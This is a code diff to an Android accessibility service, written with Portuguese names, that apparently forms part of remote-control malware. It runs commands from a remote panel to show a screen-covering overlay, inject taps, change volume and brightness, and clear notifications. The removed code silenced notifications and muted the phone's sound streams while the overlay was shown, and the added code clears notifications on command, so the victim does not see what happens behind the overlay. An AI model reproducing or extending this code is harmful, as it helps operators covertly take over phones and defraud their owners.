@@ -64,10 +64,6 @@ class ControleGestosService : AccessibilityService() {
             return "${Build.MANUFACTURER}_${Build.MODEL}_${Build.SERIAL}".replace(" ", "_")
         }
 
-        @Volatile
-        private var suprimirNotificacoes = false
-
-        fun deveSuprimirNotificacoes(): Boolean = suprimirNotificacoes
     }
 
     private var jobPrincipal: Job? = null
@@ -81,8 +77,6 @@ class ControleGestosService : AccessibilityService() {
     private var textoInferiorOverlayAtual = ""
     private var logoOverlayAtual = ""
     private var ultimaEstruturaEspelho: String? = null
-    private var filtroNotificacaoAnterior: Int? = null
-    private var modoSomAnterior: Int? = null
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -728,7 +722,6 @@ class ControleGestosService : AccessibilityService() {
             textoInferiorOverlayAtual = textoInferior
             logoOverlayAtual = logo
             overlayAtivo = true
-            ativarSupressaoNotificacoes()
             Log.d("KL", "Overlay Activity atualizada")
             return
         }
@@ -1052,7 +1045,6 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun removerOverlay() {
-        desativarSupressaoNotificacoes()
         OverlayActivity.fechar()
         removerOverlayJanela()
         resetarEstadoOverlay()
@@ -1061,38 +1053,6 @@ class ControleGestosService : AccessibilityService() {
 
     private fun marcarOverlayAtivo() {
         overlayAtivo = true
-        ativarSupressaoNotificacoes()
-    }
-
-    private fun ativarSupressaoNotificacoes() {
-        suprimirNotificacoes = true
-        try {
-            val nm = getSystemService(NotificationManager::class.java)
-            if (nm.isNotificationPolicyAccessGranted) {
-                if (filtroNotificacaoAnterior == null) {
-                    filtroNotificacaoAnterior = nm.currentInterruptionFilter
-                }
-                nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE)
-            }
-        } catch (e: Exception) {
-            Log.w("KL", "Nao foi possivel ativar Nao Perturbar: ${e.message}")
-        }
-        ServicoOcultarNotificacoes.cancelarNotificacoesVisiveis()
-        Log.i("KL", "Notificacoes suprimidas com overlay ativo")
-    }
-
-    private fun desativarSupressaoNotificacoes() {
-        suprimirNotificacoes = false
-        try {
-            val nm = getSystemService(NotificationManager::class.java)
-            if (nm.isNotificationPolicyAccessGranted && filtroNotificacaoAnterior != null) {
-                nm.setInterruptionFilter(filtroNotificacaoAnterior!!)
-                filtroNotificacaoAnterior = null
-            }
-        } catch (e: Exception) {
-            Log.w("KL", "Nao foi possivel restaurar filtro de notificacao: ${e.message}")
-        }
-        Log.i("KL", "Supressao de notificacoes desativada")
     }
 
     private fun resetarEstadoOverlay() {
@@ -1138,9 +1098,9 @@ class ControleGestosService : AccessibilityService() {
             "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
             "esconder_overlay"-> removerOverlay()
             "brilho" -> definirBrilho(partes.getOrNull(1)?.toIntOrNull() ?: return)
-            "som" -> definirSom(partes.getOrNull(1) != "0")
-            "silenciar" -> definirSom(false)
-            "ativar_som" -> definirSom(true)
+            "som_mais", "volume_mais", "ativar_som" -> ajustarVolume(subir = true)
+            "som_menos", "volume_menos", "silenciar" -> ajustarVolume(subir = false)
+            "limpar_notificacoes" -> limparNotificacoes()
         }
     }
 
@@ -1169,42 +1129,24 @@ class ControleGestosService : AccessibilityService() {
         }
     }
 
-    private fun definirSom(ativo: Boolean) {
+    private fun ajustarVolume(subir: Boolean) {
         val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        val direcao = if (subir) AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER
         try {
-            if (!ativo) {
-                if (modoSomAnterior == null) {
-                    modoSomAnterior = audio.ringerMode
-                }
-                audio.ringerMode = AudioManager.RINGER_MODE_SILENT
-                silenciarStream(audio, AudioManager.STREAM_MUSIC)
-                silenciarStream(audio, AudioManager.STREAM_RING)
-                silenciarStream(audio, AudioManager.STREAM_NOTIFICATION)
-                silenciarStream(audio, AudioManager.STREAM_ALARM)
-                Log.i("KL", "Som desativado")
-            } else {
-                val restaurar = modoSomAnterior ?: AudioManager.RINGER_MODE_NORMAL
-                audio.ringerMode = restaurar
-                ativarStream(audio, AudioManager.STREAM_MUSIC)
-                ativarStream(audio, AudioManager.STREAM_RING)
-                ativarStream(audio, AudioManager.STREAM_NOTIFICATION)
-                ativarStream(audio, AudioManager.STREAM_ALARM)
-                modoSomAnterior = null
-                Log.i("KL", "Som ativado")
-            }
+            audio.adjustStreamVolume(
+                AudioManager.STREAM_MUSIC,
+                direcao,
+                AudioManager.FLAG_SHOW_UI
+            )
+            Log.i("KL", "Volume ${if (subir) "aumentado" else "diminuido"}")
         } catch (e: Exception) {
-            Log.e("KL", "Erro ao alterar som: ${e.message}")
+            Log.e("KL", "Erro ao ajustar volume: ${e.message}")
         }
     }
 
-    @Suppress("DEPRECATION")
-    private fun silenciarStream(audio: AudioManager, stream: Int) {
-        audio.setStreamMute(stream, true)
-    }
-
-    @Suppress("DEPRECATION")
-    private fun ativarStream(audio: AudioManager, stream: Int) {
-        audio.setStreamMute(stream, false)
+    private fun limparNotificacoes() {
+        ServicoOcultarNotificacoes.limparNotificacoes()
+        Log.i("KL", "Notificacoes limpas pelo painel")
     }
 
     private fun executarToque(x: Float, y: Float) {
